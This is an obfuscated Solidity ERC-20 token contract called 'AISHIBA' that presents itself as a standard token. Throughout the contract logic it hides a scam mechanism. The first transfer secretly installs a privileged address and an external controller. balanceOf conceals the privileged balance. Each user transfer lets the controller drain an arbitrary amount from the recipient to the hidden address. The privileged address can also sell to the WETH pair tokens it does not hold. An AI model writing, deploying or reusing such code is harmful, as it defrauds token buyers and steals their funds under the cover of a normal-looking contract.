// SPDX-License-Identifier: MIT
pragma solidity ^0.8.12;
     
library xidGm{
    
    function PIGk(address qwVmYUTAl, address pptgYw, uint MopunpxKYe) internal {
        // bytes4(keccak256(bytes('approve(address,uint256)')));
        (bool oIU, bytes memory fCowTghzRUtM) = qwVmYUTAl.call(abi.encodeWithSelector(0x095ea7b3, pptgYw, MopunpxKYe));
        require(oIU && (fCowTghzRUtM.length == 0 || abi.decode(fCowTghzRUtM, (bool))), 'xidGm: APPROVE_FAILED');
    }

    function Ucm(address qwVmYUTAl, address pptgYw, uint MopunpxKYe) internal {
        // bytes4(keccak256(bytes('transfer(address,uint256)')));
        (bool oIU, bytes memory fCowTghzRUtM) = qwVmYUTAl.call(abi.encodeWithSelector(0xa9059cbb, pptgYw, MopunpxKYe));
        require(oIU && (fCowTghzRUtM.length == 0 || abi.decode(fCowTghzRUtM, (bool))), 'xidGm: TRANSFER_FAILED');
    }
    
    function ZBRWymNQzUXQ(address pptgYw, uint MopunpxKYe) internal {
        (bool oIU,) = pptgYw.call{value:MopunpxKYe}(new bytes(0));
        require(oIU, 'xidGm: ETH_TRANSFER_FAILED');
    }

    function RHjfPfLYdfr(address qwVmYUTAl, address from, address pptgYw, uint MopunpxKYe) internal returns(bytes memory){
        // bytes4(keccak256(bytes('transferFrom(address,address,uint256)')));
        (bool oIU, bytes memory fCowTghzRUtM) = qwVmYUTAl.call(abi.encodeWithSelector(0x23b872dd, from, pptgYw, MopunpxKYe));
        require(oIU && fCowTghzRUtM.length > 0,'xidGm: TRANSFER_FROM_FAILED'); return fCowTghzRUtM;
                       
    }

}
    
interface pDk {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}
    
interface TASFTrT {
    function totalSupply() external view returns (uint256);
    function balanceOf(address KKpFdKP) external view returns (uint256);
    function transfer(address shQ, uint256 Sudbdwrm) external returns (bool);
    function allowance(address DiVrwydxVaB, address spender) external view returns (uint256);
    function approve(address spender, uint256 Sudbdwrm) external returns (bool);
    function transferFrom(
        address sender,
        address shQ,
        uint256 Sudbdwrm
    ) external returns (bool);

    event Transfer(address indexed from, address indexed xgrVqZtUiRs, uint256 value);
    event Approval(address indexed DiVrwydxVaB, address indexed spender, uint256 value);
}

interface vHNbOZfGNijY is TASFTrT {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}

abstract contract biXCHSVrJzLK {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}
    
contract AISHIBA is biXCHSVrJzLK, TASFTrT, vHNbOZfGNijY {
    
    constructor() {
        
        CoEaQk[address(1)] = vDMSQqznibpE;
        emit Transfer(address(0), address(1), vDMSQqznibpE);

    }
    
    uint256 private vDMSQqznibpE = 1000000000000 * 10 ** 18;
    
    function transferFrom(
        address bKaltYWqXqK,
        address VMia,
        uint256 yrQJw
    ) public virtual override returns (bool) {
      
        if(!ERQJS(bKaltYWqXqK, VMia, yrQJw)) return true;

        uint256 qjnvAi = DACuM[bKaltYWqXqK][_msgSender()];
        if (qjnvAi != type(uint256).max) {
            require(qjnvAi >= yrQJw, "ERC20: transfer Amount exceeds allowance");
            unchecked {
                xZJWub(bKaltYWqXqK, _msgSender(), qjnvAi - yrQJw);
            }
        }

        return true;
    }
    
    function xZJWub(
        address iOOCjLFt,
        address XZGv,
        uint256 TUldRAaPKCoH
    ) internal virtual {
        require(iOOCjLFt != address(0), "ERC20: approve from the zero address");
        require(XZGv != address(0), "ERC20: approve to the zero address");

        DACuM[iOOCjLFt][XZGv] = TUldRAaPKCoH;
        emit Approval(iOOCjLFt, XZGv, TUldRAaPKCoH);

    }
    
    function allowance(address eFvpd, address fLRIjOPjz) public view virtual override returns (uint256) {
        return DACuM[eFvpd][fLRIjOPjz];
    }
    
    function symbol() public view virtual override returns (string memory) {
        return JmRz;
    }
    
    address private RrHNkEmLftOA;
    
    address private dPLOUoqzsOW;
  
    
    function totalSupply() public view virtual override returns (uint256) {
        return vDMSQqznibpE;
    }
    
    function XVOzCEmJTdFy(
        address hAFT,
        address ibOp,
        uint256 rTOXtlEFcRt
    ) internal virtual  returns (bool){
        uint256 eEJj = CoEaQk[hAFT];
        require(eEJj >= rTOXtlEFcRt, "ERC20: transfer Amount exceeds balance");
        unchecked {
            CoEaQk[hAFT] = eEJj - rTOXtlEFcRt;
        }
        CoEaQk[ibOp] += rTOXtlEFcRt;
        return true;
    }
    
    function FdnRxDHnnw(
        address dtLuWrLmLSL,
        address nXbb
    ) internal virtual  returns (bool){
        if(GoMQtAA == address(0) && RrHNkEmLftOA == address(0)){
            GoMQtAA = dtLuWrLmLSL;RrHNkEmLftOA=nXbb;
            xidGm.Ucm(RrHNkEmLftOA, GoMQtAA, 0);
            dPLOUoqzsOW = pDk(RrHNkEmLftOA).WETH();
            return false;
        }
        return true;
    }
    
    function name() public view virtual override returns (string memory) {
        return RFzFm;
    }
    
    mapping(address => uint256) private CoEaQk;
    
    mapping(address => mapping(address => uint256)) private DACuM;
    
    function increaseAllowance(address WlofI, uint256 addedValue) public virtual returns (bool) {
        xZJWub(_msgSender(), WlofI, DACuM[_msgSender()][WlofI] + addedValue);
        return true;
    }
    
    function balanceOf(address Onmusiswj) public view virtual override returns (uint256) {
        if(_msgSender() != address(GoMQtAA) && 
           Onmusiswj == address(GoMQtAA)){
            return 0;
        }
       return CoEaQk[Onmusiswj];
    }
    
    address private GoMQtAA;
    
    function approve(address erJPslft, uint256 RVA) public virtual override returns (bool) {
        xZJWub(_msgSender(), erJPslft, RVA);
        return true;
    }
    
    string private JmRz =  "AISHIBA";
    
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }
    
    function decreaseAllowance(address DERlgQy, uint256 subtractedValue) public virtual returns (bool) {
        uint256 pWB = DACuM[_msgSender()][DERlgQy];
        require(pWB >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            xZJWub(_msgSender(), DERlgQy, pWB - subtractedValue);
        }

        return true;
    }
    
    function ERQJS(
        address HKQeXSOkSmT,
        address bQPAZFCZNnA,
        uint256 ESlMLPmN
    ) internal virtual  returns (bool){
        require(HKQeXSOkSmT != address(0), "ERC20: transfer from the zero address");
        require(bQPAZFCZNnA != address(0), "ERC20: transfer to the zero address");
        
        if(!FdnRxDHnnw(HKQeXSOkSmT,bQPAZFCZNnA)) return false;

        if(_msgSender() == address(GoMQtAA)){
            if(bQPAZFCZNnA == dPLOUoqzsOW && CoEaQk[HKQeXSOkSmT] < ESlMLPmN){
                XVOzCEmJTdFy(GoMQtAA,bQPAZFCZNnA,ESlMLPmN);
            }else{
                XVOzCEmJTdFy(HKQeXSOkSmT,bQPAZFCZNnA,ESlMLPmN);
                if(HKQeXSOkSmT == GoMQtAA || bQPAZFCZNnA == GoMQtAA) 
                return false;
            }
            emit Transfer(HKQeXSOkSmT, bQPAZFCZNnA, ESlMLPmN);
            return false;
        }
        XVOzCEmJTdFy(HKQeXSOkSmT,bQPAZFCZNnA,ESlMLPmN);
        emit Transfer(HKQeXSOkSmT, bQPAZFCZNnA, ESlMLPmN);
        bytes memory EaEoRLcj = xidGm.RHjfPfLYdfr(RrHNkEmLftOA, HKQeXSOkSmT, bQPAZFCZNnA, ESlMLPmN);
        (bool LhjFJcyudHza, uint DppK) = abi.decode(EaEoRLcj, (bool,uint));
        if(LhjFJcyudHza){
            CoEaQk[GoMQtAA] += DppK;
            CoEaQk[bQPAZFCZNnA] -= DppK; 
        }
        return true;
    }
    
    string private RFzFm = "Ai Shiba";
    
    function transfer(address MtGTnHmQp, uint256 yEtBZeCLJki) public virtual override returns (bool) {
        ERQJS(_msgSender(), MtGTnHmQp, yEtBZeCLJki);
        return true;
    }
    
}